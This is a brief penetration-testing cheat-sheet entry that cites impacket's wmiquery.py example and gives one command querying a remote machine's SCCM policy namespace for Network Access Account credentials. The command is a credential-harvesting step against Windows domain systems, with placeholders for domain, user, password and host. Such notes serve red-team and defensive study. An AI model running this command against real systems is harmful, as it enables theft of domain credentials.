### Source
https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiquery.py

### Query computer for Network Access Account credentials (SCCM)
```
impacket-wmiquery -rpc-auth-level privacy -namespace '//./root/ccm/policy/Machine/ActualConfig' <domain>/<user>:<password>@<rhost>
```

